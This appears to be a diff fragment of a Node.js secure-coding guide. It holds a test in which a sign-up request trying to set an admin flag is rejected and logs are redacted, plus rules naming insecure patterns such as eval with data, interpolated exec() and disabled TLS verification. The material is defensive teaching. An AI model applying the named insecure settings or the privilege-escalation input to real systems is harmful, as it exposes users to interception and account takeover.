+      const body = { email: "ana@example.com", displayName: "Ana", password: "a long passphrase", isAdmin: true };
+      const parsed = SignUp.safeParse(body);
+      console.log("sign-up accepted:", parsed.success, parsed.error?.issues.map((i) => i.code).join(","));
+      log("signup_rejected", { headers: { authorization: "Bearer at-123" }, body });
+    expected: |-
+      invalid config: PAYMENT_API_KEY
+      sign-up accepted: false unrecognized_keys
+      {"event":"signup_rejected","headers":{"authorization":"[redacted]"},"body":{"email":"[redacted]","displayName":"Ana","password":"[redacted]","isAdmin":true}}
+    applies:
+      platforms: [node]
+      runtime: Node.js 22.18+
+      versions: { typescript: ">=5.5", node: ">=22.18", zod: ">=4.0" }
+    sources:
+      - title: Logging Cheat Sheet — OWASP
+        url: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
+      - title: Redaction — pino
+        url: https://getpino.io/#/docs/redaction
+      - title: Env variables and modes — Vite
+        url: https://vite.dev/guide/env-and-mode
+    validation: *ran
+  - id: security-privacy-rules
+    kind: rules
+    title: Security and privacy rules
+    note: What reviewers and auditors look for first.
+    items:
+      - tone: bad
+        text: "Tokens in `localStorage`, secrets in the bundle, or `decodeJwt()` used as authentication. The browser is not a safe; the server decides."
+      - tone: bad
+        text: "`innerHTML`, `insertAdjacentHTML`, `eval` and `new Function` with data. `require-trusted-types-for 'script'` (Baseline 2026) makes the browser refuse them — roll it out in `Content-Security-Policy-Report-Only` first, then add named policies, because it breaks every library that writes HTML strings."
+      - tone: bad
+        text: "SQL built with template strings, `exec()` with interpolated input, file paths joined from user input. Bind parameters, use `execFile` with an argument array, resolve paths inside a fixed directory."
+      - tone: bad
+        text: "`rejectUnauthorized: false`, `NODE_TLS_REJECT_UNAUTHORIZED=0` or a custom `checkServerIdentity` that returns early — TLS without certificate verification is plaintext with extra steps. Add a private CA with `ca:` or `NODE_EXTRA_CA_CERTS` instead."
+      - tone: good
+        text: "HTTPS everywhere with HSTS; cookies `HttpOnly; Secure; SameSite=Lax` with the `__Host-` prefix; refuse writes whose origin is not proven to be yours."
+      - tone: good
+        text: "Validate at every boundary — request bodies, query strings, environment, webhooks, `postMessage` — with a schema, and reject unknown keys on writes."
+      - tone: good
+        text: "**Minimise**: collect only the fields a feature needs, keep them only as long as it needs them, and delete on account closure. **Consent**: load analytics and marketing scripts only after an explicit opt-in, and make withdrawing as easy as granting."
+      - tone: bad
+        text: "Logging request bodies, headers, tokens, passwords, card numbers or full emails. Redact in the logger's configuration, not at each call site."
+      - tone: good
+        text: "Prefer **Argon2id** for passwords where you have it (OWASP: m=19 MiB, t=2, p=1): `crypto.argon2(\"argon2id\", …)` on Node 24.7+ (\"Stability: 1.2 - Release candidate\"), or the `argon2` npm package on Node 22; scrypt at N=2^17, r=8, p=1 is OWASP's fallback."
+      - tone: neutral
+        text: "Crypto primitives come from `crypto.subtle` or `node:crypto`, never a hand-rolled algorithm; let vetted libraries (jose, oidc-client-ts, SimpleWebAuthn) own the protocols."
